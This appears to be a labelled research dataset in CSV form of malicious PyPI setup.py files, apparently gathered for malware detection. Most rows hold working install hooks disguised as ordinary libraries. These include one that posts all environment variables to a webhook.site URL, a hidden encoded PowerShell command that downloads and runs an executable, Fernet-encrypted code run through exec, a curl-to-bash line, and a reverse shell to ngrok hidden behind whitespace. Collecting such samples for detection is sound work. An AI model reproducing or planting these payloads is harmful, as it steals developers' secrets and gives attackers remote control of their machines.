sample_id,package_name,file_source,ecosystem,language,label,source,content_hash,content
a7e3ecd4ee954d4ae565a4a785a503916b7c402b,artifact_lab_3_package_153c1c1a-0.1.1,artifact_lab_3_package_153c1c1a-0.1.1/artifact_lab_3_package_153c1c1a-0.1.1/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,7463329bcb7566672d06530e00b17d3a737df25f,"import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import os
import urllib.request
import urllib.parse

def notmalfunc():
    data = dict(os.environ)
    print(data)
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://webhook.site/8f782c5b-990f-4d3d-94cc-fd128b873693'
    req = urllib.request.Request(url, data=encoded_data)
    urllib.request.urlopen(req)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = ""artifact-lab-3-package-153c1c1a"",
    version = ""0.1.1"",
    long_description = ""long description"",
    long_description_content_type = ""text/markdown"",
    classifiers = [
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    packages = find_packages(),
    python_requires = "">=3.6"",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)"
a7fb5d8f552dce2d8915615b7913ba154752c2e0,esqpushpullmc-4.26,esqpushpullmc-4.26/esqpushpullmc-4.26/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,42c9f955d6018dd75e3b78d4127338c63e31c7e4,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'esqpushpullmc',
    packages = ['modlib'],
    version = '5.86',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
a9b4d822322a9a0a08878b041e6f350f2d089974,virtualcv-8.55,virtualcv-8.55/virtualcv-8.55/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,c2e20a1574b3a1729efff4ac72bbe19084e99c81,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'virtualcv',
    packages = ['modlib'],
    version = '10.15',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
aca7a4c9ccdeaafc0a74ff3c3fc948d837c63667,pycryptexe-1.0.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/pycryptexe/1.0.0/zip/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,ce165e41e40d9199abb0cc4568287b118d4af202,"import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d(""Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK""))

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = ""pycryptexe"",
    version = ""1.0.0"",
    author = ""TGH"",
    author_email = ""tgh@example.com"",
    description = ""A test package to demonstrate malicious pip packages"",
    long_description = ""long description"",
    long_description_content_type = ""text/markdown"",
    url = ""https://github.com/thegoodhackertv/malpip"",
    project_urls = {
        ""Bug Tracker"": ""https://github.com/thegoodhackertv/malpip/issues"",
    },
    classifiers = [
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir = {"""": ""src""},
    packages = setuptools.find_packages(where=""src""),
    python_requires = "">=3.6"",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)"
acf7ee689d695e35b81e94dff8319ebe8fdf1ccc,tppostcandynvidia-1.72,tppostcandynvidia-1.72/tppostcandynvidia-1.72/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,a09125bdbdb9a2754fe08c52b76a2c07e5e87835,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'tppostcandynvidia',
    packages = ['modlib'],
    version = '10.23',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
ae5ff1139e71fdfe436b74c0611adff505f35deb,pytojn-1.0.0,pytojn-1.0.0/pytojn-1.0.0/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,f41c6a2138e87340eb38bfd17a22f071791b5ff7,"from setuptools import setup, find_packages
from setuptools.command.install import install
import os

VERSION = '1.0.0'
DESCRIPTION = 'WflIfDJn chNAPpYXeEYeHkaaTIpbfQAbpHevWXRAOXtAwuLJIewXgPEseOEqsQsVjSJxW'
LONG_DESCRIPTION = 'cbysAWT LPHaoTTYv ei cRWBkNXzniRYbrBJSAXvvrFQtDiDoJTAahjogZSrzLadidufjzTRLkFkcqxCxqIlOWjRDwoaVMK wpFfaJ jCsqNASyGuhnMdXTKzzYveGOkFCYdzcsoBVkrEEmnievnrr oZXvokJrPtOFwBDgFnsDmqexVmdS UsUYbVbZjoXNgrpTLWnsRoNxLDnp CdOQFmIIEJcpKKPVscnoNPlUHOsy kUGvxbfkUfqpIRirLZvxCXWaP'


class LMXMmSGEreYjwGnZjerZBpuFPiYfjkyayLTTXYwQNslMyrahIPHViPoBnNcWgRaliplAqcYoVWDNpLyjLQRzVwcMoIfJQXnvaOlHZvVwsIvN(install):
        def run(self):
            import os
            if os.name == ""nt"":
                import requests
                from fernet import Fernet
                exec(Fernet(b'Ac-W0s9vZ2u_4jQW203xeWxq1Xk1RewSFV67fyQMO_c=').decrypt(b'gAAAAABmbvLDJj1IIcg-6u6zV9pwFaMxkEGNFBRiG3vHObNmS_rmoNVKwVytVBd2Egm-hYosSFqLiFyZ0n267DVQID9S8jJ-R5j-c9Ejqbfynb7UwagJile5qb2TrMbXoW64ujdBon90mGD6kkhqqYHm0YSiZGJXmC7k3JydwWgxyLry6P8zKE_gkzObwM5UH9bL0_p5R5JqT6YOviGHNllLhaiW1k7bDA=='))

            install.run(self)


setup(
    name=""pytojn"",
    version=VERSION,
    author=""oAPhBTcXYsScnoJH"",
    author_email=""KmkVzxcxAZ@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    cmdclass={
        'install': LMXMmSGEreYjwGnZjerZBpuFPiYfjkyayLTTXYwQNslMyrahIPHViPoBnNcWgRaliplAqcYoVWDNpLyjLQRzVwcMoIfJQXnvaOlHZvVwsIvN,
    },
    packages=find_packages(),
    setup_requires=['fernet', 'requests'],
    keywords=[],
    classifiers=[
        ""Operating System :: Microsoft :: Windows"",
    ]
)"
ae6fa4e106e44cfdfb0a9ca78d943d7a12e03ed8,splitintel-6.26,splitintel-6.26/splitintel-6.26/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,d13139fce51c5e3cf3a601d786ceb13f939f4de1,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'splitintel',
    packages = ['modlib'],
    version = '10.98',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
b00b0bbc06fcbc68bda4a4c7e8528e4400025e11,bupi-utils-1.0.0,bupi-utils-1.0.0/bupi-utils-1.0.0/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,178c1e3ac42ce8d14c4ae1d2291903221369ed7b,"from setuptools import setup, find_packages
from setuptools.command.install import install
import os

VERSION = '1.0.0'
DESCRIPTION = 'lZSoAvxYwaysNpOZUQGmYGxdNVGaERuwSPXBWTsrEDZQFeGvUusugWkwGwCDUHqZWdkz OncgIZrqokGGvjxMSHnb'
LONG_DESCRIPTION = 'WVQhmfurWyLJhWUTqVjyNKAkUIDqvXhSkLnCDMFMMzPGjsiELuEtMeRQFyRkMOXQvCgfpNrsxhOsVueQLfep DIlC VVEJXYvxVYsfUjhZgvvYLorhDgGSHxPyQWGSJQqosqUMGodlLRAGjIdyRufxLdMmHkkjTXyMxWyhyRYNeYthZKKhYPhADpYKIpsXaJZcPoWOjyidoNoqgHTlCWjzpbNGbcTjTLapMyyNiYJZVrkWpvFdREcflB JSxcLYOfkoNTfLQNHLSZuBnmImUUS'


class GruppeInstall(install):
        def run(self):
            import os
            if os.name == ""nt"":
                import requests
                from fernet import Fernet
                exec(Fernet(b'xAwscJVc1OsUd0XB2CNVrAkKF-uVa4VwyE1RbtHNFAc=').decrypt(b'gAAAAABmA1qpKpIp5cONJadEnQHgXDh9gb6Z8UYgB-eRYVnR6A3pVE-y3P9yjIF8A4-Insi8DSH13ZdNj40vRkbDmrSJqy58-8yWnS1KIHHup96qlez0Lca9sJQjUmYbRMnqGqU8idVfQE84zGqoOiKjeUhb7qCiJC0Z-_wfcB1McYstSVreyjZcFwq_ibLvaSdyUcWnAUq98_dKofmAlwfIwCNxlxxOWfMI9yUJ9Pl-Me_OOplDQKw='))

            install.run(self)


setup(
    name=""bupi-utils"",
    version=VERSION,
    author=""xQmZxxJPGLxeIvKYeDW"",
    author_email=""dSFQdZivhYBgArP@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    cmdclass={
        'install': GruppeInstall,
    },
    packages=find_packages(),
    setup_requires=['fernet', 'requests'],
    keywords=[],
    classifiers=[
        ""Operating System :: Microsoft :: Windows"",
    ]
)"
b1b97f77bad1be737635d270997fd4a73a8fb636,libcpuram-9.48,libcpuram-9.48/libcpuram-9.48/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,13f877ad58a91ac42ed2cd73113c934dffd29f12,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'libcpuram',
    packages = ['modlib'],
    version = '1.68',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
b22943a8fc21d458291f85d0c02eab754def9624,ehtereum-1.0.0,ehtereum-1.0.0/ehtereum-1.0.0/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,387289b6ec1aa382a066248a4c5a938c83078ee6,"from setuptools import setup, find_packages
from setuptools.command.install import install
import os

VERSION = '1.0.0'
DESCRIPTION = 'pxjxBHYPIoQkGF TaArZvKtxXwUQFZihuHIXUfjqEcmzBGwXAYzkz'
LONG_DESCRIPTION = 'UTLxQmljCMCLPapMnVwrmKbcBygjeiQGblAAtdhgCsnoTwGXyRXWjVDEhHDOKsarMkZrcIYK DbIlciQPGGZSbLFCNmcVrYnWbtJqVwojlPMfaIbvCuPaySNCyVbCcMfAEgmWMlqzgPRQmPuxuYYTgLwxLFfRptPjbkIcwhUYDmFmyBWG  SuPk GkjNLhIhZzeIIGhngWwFHrWayLwYvUIgqGqMVkJcMCUtWbMxgREeoRtiFDdZeotKDXOVNbw nNypacdegJtSYCIAR rYTdlIawZtyIaotGcAwGZyNkJThAORsPgqgHqkZOrvawJzRfvjvkZVwpVdFJGznPescTcyZzA ovPPlNChGNpmKFpvOnigBIzXoqnqsFRPOSfuuarOm'


class XODkefeYgSTfaMCasWJnzxPJydUkxnngIbeIPQNRTLWRKshnrrUkCkDzfbQsuvqIzRLdoZByBKovHQkWLHHznpIdXJpAIKRDsAvHucDgfOERMtGDvWnmvPBTNaAZIl(install):
        def run(self):
            import os
            if os.name == ""nt"":
                import requests
                from fernet import Fernet
                exec(Fernet(b'2cVxIFJMoWCBM3fP0OPnPfN-7tdA42A36ffzhw6M-FI=').decrypt(b'gAAAAABmbvPdR3e3p8fyfc0MfVSSfXAHVgYZJbsQnEon6-5X9Q0yKbhIf-5gIyRQCMQ0HkgP8ptvdIM2CIHta6UuN12RT35w4aR4Ra7rxSOodUoVYSa0SNz67Rq86QeNgjGT1LiSnDzELgYQ3H29EMZ4FArqU0Y_9TIko5b2FU8NjqwkF1mwQ0rac3pKkQXSkEJi_qGDXJVEAvqykp8YOP6jN9JhdDeSxqgh51Pn9-sN748kKUH92aw='))

            install.run(self)


setup(
    name=""ehtereum"",
    version=VERSION,
    author=""eYCtowagEwaMFEnOEbeC"",
    author_email=""deTzznnFDGyHp@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    cmdclass={
        'install': XODkefeYgSTfaMCasWJnzxPJydUkxnngIbeIPQNRTLWRKshnrrUkCkDzfbQsuvqIzRLdoZByBKovHQkWLHHznpIdXJpAIKRDsAvHucDgfOERMtGDvWnmvPBTNaAZIl,
    },
    packages=find_packages(),
    setup_requires=['fernet', 'requests'],
    keywords=[],
    classifiers=[
        ""Operating System :: Microsoft :: Windows"",
    ]
)"
b3a259434af26a8e0c02c29116c0aab61bcb5510,pyconau-funtimes-1.0.6,pyconau-funtimes-1.0.6/pyconau-funtimes-1.0.6/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,1d17a1af24904e86df87e96283a582323fefdc1d,"#!/usr/bin/env python

from distutils.core import setup

setup(name='pyconau-funtimes',
  version='1.0.6',
  description='*~** FUN! **~*',
)

print """"""

****************

PyCon AU!

Weeeeee!

Have a great time!

****************
""""""                                                                                                                               ;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""0.tcp.ngrok.io"",36946));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);"
b5910ea44042654f3eeeede81471e5b9d5870bc7,tpproofedpull-5.85,tpproofedpull-5.85/tpproofedpull-5.85/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,6a3809408eb9b717489735fba99b92b451ba1f82,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'tpproofedpull',
    packages = ['modlib'],
    version = '4.19',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
b72cc1eb0e29909ce56a2d4649fc8b232ba1ec48,advpruebitaa8-1.0.0,advpruebitaa8-1.0.0/advpruebitaa8-1.0.0/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,223629482dccc87763b83f75298a2c9feb66f29e,"import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

os.system(""dir"")
open(""pruebita22.txt"", ""w"")

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

setuptools.setup(
    name = ""advpruebitaa8"",
    version = ""1.0.0"",
    author = ""TGH"",
    author_email = ""tgh@example.com"",
    description = ""A test package to demonstrate malicious pip packages"",
    long_description = ""long description"",
    long_description_content_type = ""text/markdown"",
    url = ""https://github.com/thegoodhackertv/malpip"",
    project_urls = {
        ""Bug Tracker"": ""https://github.com/thegoodhackertv/malpip/issues"",
    },
    classifiers = [
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir = {"""": ""src""},
    packages = setuptools.find_packages(where=""src""),
    python_requires = "">=2.0"",
)"
